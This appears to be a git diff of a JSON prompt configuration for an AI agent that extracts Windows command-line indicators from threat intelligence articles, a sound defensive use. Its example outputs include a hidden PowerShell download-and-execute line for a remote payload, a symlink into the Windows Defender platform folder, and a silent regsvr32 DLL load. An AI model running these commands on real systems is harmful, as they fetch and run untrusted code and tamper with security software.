@@ -1,55 +1,8 @@
 {
   "role": "You are a specialized extraction agent focused on extracting explicit Windows command-line observables from threat intelligence articles.",
-  "objective": "Extract only Windows command lines that appear literally in the article content, contain a Windows executable or system utility, and include at least one argument, switch, parameter, pipeline, or redirection.",
-  "input": {
-    "article_url": "{article_url}",
-    "article_content": "{article_content}",
-    "article_title": "{article_title}"
-  },
-  "extraction_criteria": {
-    "must_include_all": [
-      "A. Literal presence: The full command must appear as literal text in article_content within inline code, code blocks, quoted text, or plaintext paragraphs. If a command is line-wrapped in a labeled field (e.g., 'CommandLine:'), the entire wrapped block is treated as one single command-line.",
-      "B. Windows executable or system utility + arguments: The command must include one of: A Windows executable (e.g., cmd.exe, powershell.exe, pwsh.exe, regsvr32.exe, rundll32.exe, mshta.exe, certutil.exe, schtasks.exe, wmic.exe, MpCmdRun.exe, ClipUp.exe, GT_NET.exe, or any .exe clearly executed in a Windows context) OR a Windows built-in system utility (e.g., ipconfig, net, dir, ping). AND the command must contain at least one argument, switch, flag, parameter, pipeline, or redirection.",
-      "C. cmd.exe and chained commands: A cmd.exe or cmd /c chain with multiple Windows commands joined by &&, &, or | MUST be treated as ONE command-line if it appears as one literal printed field. Commands inside the chain count as part of the command-line and should NOT be separated."
-    ],
-    "valid_examples": [
-      "cmd.exe /c mklink /D \"C:\\ProgramData\\roming\" \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0\"",
-      "powershell -w hidden -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://../payload.ps1')\"",
-      "regsvr32.exe /S \"C:\\ProgramData\\Roning\\goldendays.dll\"",
-      "GT_NET.exe -m:scan -i:f -d:list.txt",
-      "ipconfig /all > \"C:\\ProgramData\\CentreStac_log.txt\"",
-      "Any multi-line 'CommandLine:' field printed by Sysmon where the full chain is literal"
-    ]
-  },
-  "exclusions": {
-    "do_not_extract": [
-      "A. Non-text or incomplete commands: Commands shown only in images/screenshots, commands with NO arguments (e.g., whoami, systeminfo, ipconfig, nltest, route print, a bare adfind.exe with no arguments).",
-      "B. Non-command or too-atomic items: Filenames alone (e.g., msutil.exe, svchost.exe), drive-letter declarations (e.g., Z:), API/method calls without exposed literal commands (e.g., IWshShell3.Run('...') when the command itself is not visible).",
-      "C. Inferred or non-literal descriptions: Descriptions of commands rather than the exact printed command, Linux/Unix/macOS commands (e.g., curl, wget, bash, chmod, dd).",
-      "General rule: If there is ANY doubt, exclude the string."
-    ]
-  },
-  "output_format": {
-    "cmdline_items": "Array of unique Windows command-line strings, each preserved EXACTLY as printed (casing, spacing, slashes/backslashes, punctuation, quoting). If a command wraps across multiple lines, reconstruct it into ONE single-line literal string by joining segments exactly in order without altering spacing or punctuation.",
-    "count": "Integer total count of unique extracted command lines",
-    "qa_corrections": {
-      "removed": "Array of objects with 'command' and 'reason' fields for commands removed during QA",
-      "added": "Array of objects with 'command' and 'found_in' fields for commands added during targeted rescan",
-      "summary": "String summary of QA corrections applied, or 'None.' if no corrections"
-    }
-  },
-  "json_example": {
-    "cmdline_items": [
-      "cmd.exe /c mklink /D \"C:\\ProgramData\\roming\" \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0\"",
-      "powershell -w hidden -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\""
-    ],
-    "count": 2,
-    "qa_corrections": {
-      "removed": [],
-      "added": [],
-      "summary": "None."
-    }
-  },
-  "instructions": "CRITICAL: You are a JSON-only output agent. Your response must be valid JSON that can be parsed by json.loads().\n\nOUTPUT RULES:\n1. NO markdown code fences (no ```json or ```)\n2. NO explanatory text before or after the JSON\n3. If you are a reasoning model, put reasoning BEFORE the JSON block, then output ONLY the JSON\n4. The JSON must start with { and end with }\n5. The JSON structure MUST match json_example exactly\n6. CRITICAL: All backslashes in Windows paths MUST be escaped. Use \\\\ for each backslash.\n   - WRONG: \"C:\\ProgramData\\file.exe\"\n   - CORRECT: \"C:\\\\ProgramData\\\\file.exe\"\n   - All Windows paths with backslashes need double backslashes in JSON strings\n\nEXTRACTION TASK:\nExtract Windows command-line observables from the article. Only extract commands that:\n- Appear literally in the text\n- Are Windows executables (.exe) or Windows system utilities\n- Have at least one argument/switch/parameter\n\nOUTPUT TEMPLATE (use this exact structure with proper escaping):\n{\"cmdline_items\": [\"cmd.exe /c echo test\", \"powershell -Command Write-Host\"], \"count\": 2, \"qa_corrections\": {\"removed\": [], \"added\": [], \"summary\": \"None.\"}}\n\nIf no commands found, output:\n{\"cmdline_items\": [], \"count\": 0, \"qa_corrections\": {\"removed\": [], \"added\": [], \"summary\": \"None.\"}}\n\nREMEMBER: Windows paths in JSON strings must have double backslashes (\\\\)."
+  "user_template": "Title: {title}\nURL: {url}\n\nContent:\n{content}\n\nTask: {task}\n\nOutput Format:\n{json_example}\n\nInstructions: {instructions}\n\nIMPORTANT: Your response must end with a valid JSON object matching the structure above. If you include reasoning, place it BEFORE the JSON. The JSON must be parseable and complete.",
+  "task": "Extract only Windows command lines that appear literally in the article content, contain a Windows executable or system utility, and include at least one argument, switch, parameter, pipeline, or redirection.",
+  "json_example": "{\n  \"cmdline_items\": [\n    \"cmd.exe /c mklink /D \\\"C:\\\\ProgramData\\\\roming\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.25050.5-0\\\"\",\n    \"powershell -w hidden -nop -ep bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\\\"\"\n  ],\n  \"count\": 2\n}",
+  "instructions": "CRITICAL: You are a JSON-only output agent. Your response must be valid JSON that can be parsed by json.loads().\n\nOUTPUT RULES:\n1. NO markdown code fences (no ```json or ```)\n2. NO explanatory text before or after the JSON\n3. If you are a reasoning model, put reasoning BEFORE the JSON block, then output ONLY the JSON\n4. The JSON must start with { and end with }\n5. The JSON structure MUST match json_example exactly\n6. CRITICAL: All backslashes in Windows paths MUST be escaped. Use \\\\ for each backslash.\n   - WRONG: \"C:\\ProgramData\\file.exe\"\n   - CORRECT: \"C:\\\\ProgramData\\\\file.exe\"\n   - All Windows paths with backslashes need double backslashes in JSON strings\n\nEXTRACTION TASK:\nExtract Windows command-line observables from the article. Only extract commands that:\n- Appear literally in the text\n- Are Windows executables (.exe) or Windows system utilities\n- Have at least one argument/switch/parameter\n\nIf no commands found, output:\n{\"cmdline_items\": [], \"count\": 0}\n\nREMEMBER: Windows paths in JSON strings must have double backslashes (\\\\)."
 }
 
